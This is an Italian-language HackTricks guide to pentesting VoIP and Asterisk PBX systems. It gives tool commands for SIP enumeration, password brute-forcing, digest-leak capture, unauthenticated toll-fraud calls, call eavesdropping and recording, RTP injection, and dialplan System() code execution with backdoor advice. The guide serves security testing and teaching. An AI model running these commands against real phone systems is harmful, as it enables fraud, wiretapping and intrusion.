# Pentesting VoIP

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="/images/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**Ottieni la prospettiva di un hacker sulle tue app web, rete e cloud**

**Trova e segnala vulnerabilità critiche ed exploitabili con un reale impatto sul business.** Usa i nostri oltre 20 strumenti personalizzati per mappare la superficie di attacco, trovare problemi di sicurezza che ti permettano di elevare i privilegi e utilizzare exploit automatizzati per raccogliere prove essenziali, trasformando il tuo duro lavoro in report persuasivi.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## Informazioni di base su VoIP

Per iniziare a imparare come funziona VoIP, controlla:

{{#ref}}
basic-voip-protocols/
{{#endref}}

## Messaggi di base
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## Codici di Risposta

**1xx—Risposte Provvisorie**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xx—Risposte di Successo**
```
200 OK
202 Accepted
204 No Notification
```
**3xx—Risposte di reindirizzamento**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xx—Risposte di errore del client**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xx—Risposte di errore del server**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xx—Risposte di errore globale**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## VoIP Enumeration

### Numeri di telefono

Uno dei primi passi che un Red Team potrebbe fare è cercare numeri di telefono disponibili per contattare l'azienda utilizzando strumenti OSINT, ricerche su Google o scraping delle pagine web.

Una volta ottenuti i numeri di telefono, puoi utilizzare servizi online per identificare l'operatore:

- [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis&sub=phonenr)
- [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
- [https://www.whitepages.com/](https://www.whitepages.com/)
- [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

Sapere se l'operatore fornisce servizi VoIP ti permetterà di identificare se l'azienda sta utilizzando VoIP... Inoltre, è possibile che l'azienda non abbia assunto servizi VoIP ma stia utilizzando schede PSTN per collegare il proprio PBX VoIP alla rete telefonica tradizionale.

Cose come risposte automatiche di musica di solito indicano che viene utilizzato VoIP.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### Informazioni OSINT

Qualsiasi altra enumerazione OSINT che aiuti a identificare il software VoIP in uso sarà utile per un Red Team.

### Enumerazione della rete

- **`nmap`** è in grado di scansionare i servizi UDP, ma a causa del numero di servizi UDP scansionati, è molto lento e potrebbe non essere molto preciso con questo tipo di servizi.
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
- **`svmap`** da SIPVicious (`sudo apt install sipvicious`): Localizzerà i servizi SIP nella rete indicata.
- `svmap` è **facile da bloccare** perché utilizza l'User-Agent `friendly-scanner`, ma puoi modificare il codice da `/usr/share/sipvicious/sipvicious` e cambiarlo.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
- **`SIPPTS scan`** da [**sippts**](https://github.com/Pepelux/sippts)**:** La scansione SIPPTS è uno scanner molto veloce per i servizi SIP su UDP, TCP o TLS. Utilizza il multithreading e può scansionare ampie gamme di reti. Consente di indicare facilmente un intervallo di porte, scansionare sia TCP che UDP, utilizzare un altro metodo (per impostazione predefinita utilizzerà OPTIONS) e specificare un User-Agent diverso (e altro).
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
- **metasploit**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Enumerazione Aggiuntiva della Rete

Il PBX potrebbe anche esporre altri servizi di rete come:

- **69/UDP (TFTP)**: Aggiornamenti del firmware
- **80 (HTTP) / 443 (HTTPS)**: Per gestire il dispositivo dal web
- **389 (LDAP)**: Alternativa per memorizzare le informazioni degli utenti
- **3306 (MySQL)**: Database MySQL
- **5038 (Manager)**: Consente di utilizzare Asterisk da altre piattaforme
- **5222 (XMPP)**: Messaggi utilizzando Jabber
- **5432 (PostgreSQL)**: Database PostgreSQL
- E altri...

### Enumerazione dei Metodi

È possibile trovare **quali metodi sono disponibili** da utilizzare nel PBX usando `SIPPTS enumerate` da [**sippts**](https://github.com/Pepelux/sippts)
```bash
sippts enumerate -i 10.10.0.10
```
### Analisi delle risposte del server

È molto importante analizzare le intestazioni che un server ci restituisce, a seconda del tipo di messaggio e delle intestazioni che inviamo. Con `SIPPTS send` da [**sippts**](https://github.com/Pepelux/sippts) possiamo inviare messaggi personalizzati, manipolando tutte le intestazioni, e analizzare la risposta.
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
È anche possibile ottenere dati se il server utilizza i websockets. Con `SIPPTS wssend` da [**sippts**](https://github.com/Pepelux/sippts) possiamo inviare messaggi WS personalizzati.
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### Enumerazione delle Estensioni

Le estensioni in un sistema PBX (Private Branch Exchange) si riferiscono agli **identificatori interni unici assegnati a singole** linee telefoniche, dispositivi o utenti all'interno di un'organizzazione o azienda. Le estensioni rendono possibile **instradare le chiamate all'interno dell'organizzazione in modo efficiente**, senza la necessità di numeri di telefono esterni individuali per ogni utente o dispositivo.

- **`svwar`** da SIPVicious (`sudo apt install sipvicious`): `svwar` è uno scanner di linee di estensione SIP PBX gratuito. In concetto funziona in modo simile ai tradizionali wardialer **indovinando un intervallo di estensioni o un dato elenco di estensioni**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
- **`SIPPTS exten`** da [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS exten identifica le estensioni su un server SIP. Sipexten può controllare ampie gamme di rete e porte.
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
- **metasploit**: Puoi anche enumerare estensioni/nomi utente con metasploit:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
- **`enumiax` (`apt install enumiax`): enumIAX** è un enumeratore di **username brute-force** per il protocollo Inter Asterisk Exchange. enumIAX può operare in due modalità distinte: Indovinare Username in Sequenza o Attacco a Dizionario.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## Attacchi VoIP

### Password Brute-Force - online

Avendo scoperto il **PBX** e alcuni **interni/nomi utente**, un Red Team potrebbe provare ad **autenticarsi tramite il metodo `REGISTER`** su un interno utilizzando un dizionario di password comuni per forzare l'autenticazione.

> [!CAUTION]
> Nota che un **nome utente** può essere lo stesso dell'interno, ma questa pratica può variare a seconda del sistema PBX, della sua configurazione e delle preferenze dell'organizzazione...
>
> Se il nome utente non è lo stesso dell'interno, dovrai **scoprire il nome utente da forzare**.

- **`svcrack`** da SIPVicious (`sudo apt install sipvicious`): SVCrack ti consente di decifrare la password per un nome utente/interno specifico su un PBX.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
- **`SIPPTS rcrack`** da [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrack è un cracker di password remoto per i servizi SIP. Rcrack può testare le password per diversi utenti in diversi IP e intervalli di porte.
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
- **Metasploit**:
- [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
- [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack_tcp.rb)

### VoIP Sniffing

Se trovi attrezzature VoIP all'interno di una **rete Wifi aperta**, potresti **sniffare tutte le informazioni**. Inoltre, se sei all'interno di una rete più chiusa (connessa tramite Ethernet o Wifi protetto) potresti eseguire **attacchi MitM come** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) tra il **PBX e il gateway** per sniffare le informazioni.

Tra le informazioni di rete, potresti trovare **credenziali web** per gestire l'attrezzatura, **estensioni** utente, **nome utente**, indirizzi **IP**, persino **password hashate** e **pacchetti RTP** che potresti riprodurre per **ascoltare la conversazione**, e altro ancora.

Per ottenere queste informazioni potresti utilizzare strumenti come Wireshark, tcpdump... ma uno **strumento appositamente creato per sniffare conversazioni VoIP è** [**ucsniff**](https://github.com/Seabreg/ucsniff).

> [!CAUTION]
> Nota che se **TLS è utilizzato nella comunicazione SIP** non sarai in grado di vedere la comunicazione SIP in chiaro.\
> Lo stesso accadrà se viene utilizzato **SRTP** e **ZRTP**, **i pacchetti RTP non saranno in testo chiaro**.

#### Credenziali SIP (Password Brute-Force - offline)

[Controlla questo esempio per comprendere meglio una **comunicazione SIP REGISTER**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) per apprendere come vengono **inviate le credenziali**.

- **`sipdump`** & **`sipcrack`,** parte di **sipcrack** (`apt-get install sipcrack`): Questi strumenti possono **estrarre** da un **pcap** le **autenticazioni digest** all'interno del protocollo SIP e **bruteforzarle**.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
- **`SIPPTS dump`** da [**sippts**](https://github.com/Pepelux/sippts)**:** Il dump SIPPTS può estrarre autenticazioni digest da un file pcap.
```bash
sippts dump -f capture.pcap -o data.txt
```
- **`SIPPTS dcrack`** da [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrack è uno strumento per decifrare le autenticazioni digest ottenute con il dump di SIPPTS.
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
- **`SIPPTS tshark`** da [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS tshark estrae dati del protocollo SIP da un file PCAP.
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### Codici DTMF

**Non solo le credenziali SIP** possono essere trovate nel traffico di rete, è anche possibile trovare codici DTMF che vengono utilizzati, ad esempio, per accedere alla **voicemail**.\
È possibile inviare questi codici nei **messaggi INFO SIP**, in **audio** o all'interno dei **pacchetti RTP**. Se i codici sono all'interno dei pacchetti RTP, puoi tagliare quella parte della conversazione e utilizzare lo strumento multimo per estrarli:
```bash
multimon -a DTMF -t wac pin.wav
```
### Chiamate gratuite / Configurazioni errate delle connessioni Asterisk

In Asterisk è possibile consentire una connessione **da un indirizzo IP specifico** o da **qualsiasi indirizzo IP**:
```
host=10.10.10.10
host=dynamic
```
Se viene specificato un indirizzo IP, l'host **non avrà bisogno di inviare richieste REGISTER** di tanto in tanto (nel pacchetto REGISTER viene inviato il tempo di vita, solitamente 30 minuti, il che significa che in un altro scenario il telefono dovrà registrarsi ogni 30 minuti). Tuttavia, dovrà avere porte aperte che consentono connessioni dal server VoIP per ricevere chiamate.

Per definire gli utenti, possono essere definiti come:

- **`type=user`**: L'utente può ricevere solo chiamate come utente.
- **`type=friend`**: È possibile effettuare chiamate come peer e riceverle come utente (utilizzato con le estensioni).
- **`type=peer`**: È possibile inviare e ricevere chiamate come peer (SIP-trunks).

È anche possibile stabilire fiducia con la variabile insicura:

- **`insecure=port`**: Consente connessioni peer validate per IP.
- **`insecure=invite`**: Non richiede autenticazione per i messaggi INVITE.
- **`insecure=port,invite`**: Entrambi.

> [!WARNING]
> Quando viene utilizzato **`type=friend`**, il **valore** della variabile **host** **non verrà utilizzato**, quindi se un admin **misconfigura un SIP-trunk** utilizzando quel valore, **chiunque potrà connettersi ad esso**.
>
> Ad esempio, questa configurazione sarebbe vulnerabile:\
> `host=10.10.10.10`\
> `insecure=port,invite`\
> `type=friend`

### Chiamate gratuite / Misconfigurazioni del contesto Asterisk

In Asterisk un **contesto** è un contenitore o sezione nominata nel piano di chiamata che **raggruppa insieme estensioni, azioni e regole correlate**. Il piano di chiamata è il componente centrale di un sistema Asterisk, poiché definisce **come vengono gestite e instradate le chiamate in entrata e in uscita**. I contesti vengono utilizzati per organizzare il piano di chiamata, gestire il controllo degli accessi e fornire separazione tra le diverse parti del sistema.

Ogni contesto è definito nel file di configurazione, solitamente nel file **`extensions.conf`**. I contesti sono denotati da parentesi quadre, con il nome del contesto racchiuso all'interno di esse. Ad esempio:
```bash
csharpCopy code[my_context]
```
All'interno del contesto, definisci le estensioni (modelli di numeri composti) e le associ a una serie di azioni o applicazioni. Queste azioni determinano come la chiamata viene elaborata. Ad esempio:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Questo esempio dimostra un semplice contesto chiamato "my_context" con un'estensione "100". Quando qualcuno compone 100, la chiamata verrà risposta, verrà riprodotto un messaggio di benvenuto e poi la chiamata verrà terminata.

Questo è **un altro contesto** che consente di **chiamare qualsiasi altro numero**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Se l'amministratore definisce il **contesto predefinito** come:
```
[default]
include => my_context
include => external
```
> [!WARNING]
> Chiunque sarà in grado di utilizzare il **server per chiamare qualsiasi altro numero** (e l'amministratore del server pagherà per la chiamata).

> [!CAUTION]
> Inoltre, per impostazione predefinita, il file **`sip.conf`** contiene **`allowguest=true`**, quindi **qualsiasi** attaccante senza **autenticazione** sarà in grado di chiamare qualsiasi altro numero.

- **`SIPPTS invite`** da [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS invite verifica se un **server PBX ci consente di effettuare chiamate senza autenticazione**. Se il server SIP ha una configurazione errata, ci permetterà di effettuare chiamate a numeri esterni. Può anche permetterci di trasferire la chiamata a un secondo numero esterno.

Ad esempio, se il tuo server Asterisk ha una cattiva configurazione del contesto, puoi accettare richieste INVITE senza autorizzazione. In questo caso, un attaccante può effettuare chiamate senza conoscere alcun utente/password.
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
### Chiamate gratuite / IVRS mal configurati

IVRS sta per **Interactive Voice Response System**, una tecnologia telefonica che consente agli utenti di interagire con un sistema computerizzato tramite input vocali o a toni. IVRS è utilizzato per costruire sistemi di **gestione automatizzata delle chiamate** che offrono una gamma di funzionalità, come fornire informazioni, instradare chiamate e catturare input degli utenti.

IVRS nei sistemi VoIP consiste tipicamente in:

1. **Messaggi vocali**: Messaggi audio preregistrati che guidano gli utenti attraverso le opzioni e le istruzioni del menu IVR.
2. **DTMF** (Dual-Tone Multi-Frequency) signaling: Input a toni generati premendo i tasti del telefono, utilizzati per navigare nei menu IVR e fornire input.
3. **Instradamento delle chiamate**: Direzionare le chiamate alla destinazione appropriata, come dipartimenti specifici, agenti o interni in base all'input dell'utente.
4. **Cattura dell'input dell'utente**: Raccogliere informazioni dai chiamanti, come numeri di conto, ID caso o qualsiasi altro dato rilevante.
5. **Integrazione con sistemi esterni**: Collegare il sistema IVR a database o altri sistemi software per accedere o aggiornare informazioni, eseguire azioni o attivare eventi.

In un sistema VoIP Asterisk, puoi creare un IVR utilizzando il piano di composizione (**`extensions.conf`** file) e varie applicazioni come `Background()`, `Playback()`, `Read()`, e altro. Queste applicazioni ti aiutano a riprodurre messaggi vocali, catturare input degli utenti e controllare il flusso delle chiamate.

#### Esempio di configurazione vulnerabile
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
L'esempio precedente è un caso in cui all'utente viene chiesto di **premere 1 per chiamare** un dipartimento, **2 per chiamare** un altro, o **l'intero numero interno** se lo conosce.\
La vulnerabilità è il fatto che la **lunghezza dell'interno indicato non viene controllata, quindi un utente potrebbe inserire il timeout di 5 secondi di un numero completo e verrà chiamato.**

### Extension Injection

Utilizzando un interno come:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Dove **`${EXTEN}`** è l'**estensione** che verrà chiamata, quando viene **introdotta l'ext 101** questo è ciò che accadrebbe:
```scss
exten => 101,1,Dial(SIP/101)
```
Tuttavia, se **`${EXTEN}`** consente di introdurre **più di numeri** (come nelle versioni precedenti di Asterisk), un attaccante potrebbe introdurre **`101&SIP123123123`** per chiamare il numero di telefono 123123123. E questo sarebbe il risultato:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Pertanto, una chiamata all'estensione **`101`** e **`123123123`** verrà inviata e solo la prima a ricevere la chiamata sarà stabilita... ma se un attaccante utilizza un **'estensione che bypassa qualsiasi corrispondenza** che viene eseguita ma non esiste, potrebbe **iniettare una chiamata solo al numero desiderato**.

## Vulnerabilità SIPDigestLeak

La vulnerabilità SIP Digest Leak è una vulnerabilità che colpisce un gran numero di telefoni SIP, inclusi sia telefoni IP hardware che software, così come adattatori telefonici (VoIP a analogico). La vulnerabilità consente **la fuoriuscita della risposta di autenticazione Digest**, che viene calcolata dalla password. Un **attacco offline alla password è quindi possibile** e può recuperare la maggior parte delle password basate sulla risposta alla sfida.

**[Scenario di vulnerabilità da qui**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. Un telefono IP (vittima) è in ascolto su qualsiasi porta (ad esempio: 5060), accettando chiamate telefoniche
2. L'attaccante invia un INVITE al telefono IP
3. Il telefono della vittima inizia a squillare e qualcuno risponde e riattacca (perché nessuno risponde al telefono dall'altra parte)
4. Quando il telefono viene riattaccato, il **telefono della vittima invia un BYE all'attaccante**
5. L'**attaccante emette una risposta 407** che **richiede autenticazione** e emette una sfida di autenticazione
6. Il **telefono della vittima fornisce una risposta alla sfida di autenticazione** in un secondo BYE
7. L'**attaccante può quindi emettere un attacco di forza bruta** sulla risposta alla sfida sul suo computer locale (o rete distribuita, ecc.) e indovinare la password

- **SIPPTS leak** da [**sippts**](https://github.com/Pepelux/sippts)**:** Il leak SIPPTS sfrutta la vulnerabilità SIP Digest Leak che colpisce un gran numero di telefoni SIP. L'output può essere salvato in formato SipCrack per essere forzato utilizzando SIPPTS dcrack o lo strumento SipCrack.
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call consente a un **utente web** (che ad esempio potrebbe essere interessato a un prodotto) di **inserire** il proprio **numero di telefono** per essere richiamato. Poi verrà chiamato un commerciale e, quando lui **risponde al telefono**, l'utente sarà **chiamato e connesso con l'agente**.

Un profilo Asterisk comune per questo è:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
- Il profilo precedente consente a **QUALSIASI indirizzo IP di connettersi** (se la password è nota).
- Per **organizzare una chiamata**, come specificato in precedenza, **non sono necessarie autorizzazioni di lettura** e **solo** **l'origine** in **scrittura** è necessaria.

Con queste autorizzazioni, qualsiasi IP che conosce la password potrebbe connettersi ed estrarre troppe informazioni, come:
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
**Ulteriori informazioni o azioni potrebbero essere richieste.**

### **Intercettazione**

In Asterisk è possibile utilizzare il comando **`ChanSpy`** indicando l'**estensione(i) da monitorare** (o tutte) per ascoltare le conversazioni in corso. Questo comando deve essere assegnato a un'estensione.

Ad esempio, **`exten => 333,1,ChanSpy('all',qb)`** indica che se **chiami** l'**estensione 333**, essa **monitorerà** **`tutte`** le estensioni, **inizierà ad ascoltare** ogni volta che inizia una nuova conversazione (**`b`**) in modalità silenziosa (**`q`**) poiché non vogliamo interagire. Puoi passare da una conversazione all'altra premendo **`*`**, o componendo il numero dell'estensione.

È anche possibile utilizzare **`ExtenSpy`** per monitorare solo un'estensione.

Invece di ascoltare le conversazioni, è possibile **registrarle in file** utilizzando un'estensione come:
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
Le chiamate saranno salvate in **`/tmp`**.

Potresti anche far sì che Asterisk **esegua uno script che farà trapelare la chiamata** quando è chiusa.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### Vulnerabilità RTCPBleed

**RTCPBleed** è un grave problema di sicurezza che colpisce i server VoIP basati su Asterisk (pubblicato nel 2017). La vulnerabilità consente al **traffico RTP (Real Time Protocol)**, che trasporta le conversazioni VoIP, di essere **intercettato e reindirizzato da chiunque su Internet**. Questo avviene perché il traffico RTP bypassa l'autenticazione quando naviga attraverso i firewall NAT (Network Address Translation).

I proxy RTP cercano di affrontare le **limitazioni del NAT** che influenzano i sistemi RTC proxyando i flussi RTP tra due o più parti. Quando il NAT è attivo, il software del proxy RTP spesso non può fare affidamento sulle informazioni IP e porta RTP recuperate tramite segnalazione (ad es. SIP). Pertanto, un certo numero di proxy RTP ha implementato un meccanismo in cui tale **tuplet IP e porta viene appreso automaticamente**. Questo viene spesso fatto ispezionando il traffico RTP in arrivo e contrassegnando l'IP e la porta sorgente per qualsiasi traffico RTP in arrivo come quelli a cui si dovrebbe rispondere. Questo meccanismo, che può essere chiamato "modalità di apprendimento", **non utilizza alcun tipo di autenticazione**. Pertanto, **gli attaccanti** possono **inviare traffico RTP al proxy RTP** e ricevere il traffico RTP proxyato destinato al chiamante o al chiamato di uno stream RTP in corso. Chiamiamo questa vulnerabilità RTP Bleed perché consente agli attaccanti di ricevere flussi media RTP destinati a essere inviati a utenti legittimi.

Un altro comportamento interessante dei proxy RTP e degli stack RTP è che a volte, **anche se non vulnerabili a RTP Bleed**, accetteranno, inoltreranno e/o elaboreranno pacchetti RTP da qualsiasi sorgente. Pertanto, gli attaccanti possono inviare pacchetti RTP che possono consentire loro di iniettare i loro media al posto di quelli legittimi. Chiamiamo questo attacco iniezione RTP perché consente l'iniezione di pacchetti RTP illegittimi in flussi RTP esistenti. Questa vulnerabilità può essere trovata sia nei proxy RTP che nei punti finali.

Asterisk e FreePBX hanno tradizionalmente utilizzato l'impostazione **`NAT=yes`**, che consente al traffico RTP di bypassare l'autenticazione, portando potenzialmente a nessun audio o audio unidirezionale nelle chiamate.

Per ulteriori informazioni controlla [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

- **`SIPPTS rtpbleed`** da [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleed rileva la vulnerabilità RTP Bleed inviando flussi RTP.
```bash
sippts rtpbleed -i 10.10.0.10
```
- **`SIPPTS rtcpbleed`** da [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleed rileva la vulnerabilità RTP Bleed inviando flussi RTCP.
```bash
sippts rtcpbleed -i 10.10.0.10
```
- **`SIPPTS rtpbleedflood`** da [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedflood sfrutta la vulnerabilità RTP Bleed inviando flussi RTP.
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
- **`SIPPTS rtpbleedinject`** da [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedinject sfrutta la vulnerabilità RTP Bleed iniettando un file audio (formato WAV).
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

In Asterisk riesci in qualche modo a **aggiungere regole di estensione e ricaricarle** (ad esempio compromettendo un server di gestione web vulnerabile), è possibile ottenere RCE utilizzando il comando **`System`**.
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
C'è un comando chiamato **`Shell`** che potrebbe essere utilizzato **invece di `System`** per eseguire comandi di sistema se necessario.

> [!WARNING]
> Se il server **non consente l'uso di determinati caratteri** nel comando **`System`** (come in Elastix), verifica se il server web consente di **creare file in qualche modo all'interno del sistema** (come in Elastix o trixbox), e usalo per **creare uno script di backdoor** e poi usa **`System`** per **eseguire** quello **script**.

#### File locali interessanti e permessi

- **`sip.conf`** -> Contiene la password degli utenti SIP.
- Se il **server Asterisk è in esecuzione come root**, potresti compromettere root.
- L'**utente root di mysql** potrebbe **non avere alcuna password**.
- questo potrebbe essere utilizzato per creare un nuovo utente mysql come backdoor.
- **`FreePBX`**
- **`amportal.conf`** -> Contiene la password dell'amministratore del pannello web (FreePBX).
- **`FreePBX.conf`** -> Contiene la password dell'utente FreePBXuser utilizzato per accedere al database.
- questo potrebbe essere utilizzato per creare un nuovo utente mysql come backdoor.
- **`Elastix`**
- **`Elastix.conf`** -> Contiene diverse password in chiaro come la password root di mysql, la password IMAPd, la password dell'amministratore web.
- **Diverse cartelle** apparterranno all'utente asterisk compromesso (se non in esecuzione come root). Questo utente può leggere i file precedenti e controlla anche la configurazione, quindi potrebbe far caricare ad Asterisk altri binari con backdoor quando eseguiti.

### Iniezione RTP

È possibile inserire un **`.wav`** nelle conversazioni utilizzando strumenti come **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) e **`rtpmixsound`** (`sudo apt install rtpmixsound`).

Oppure potresti usare gli script da [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) per **scansionare le conversazioni** (**`rtpscan.pl`**), inviare un `.wav` a una conversazione (**`rtpsend.pl`**) e **inserire rumore** in una conversazione (**`rtpflood.pl`**).

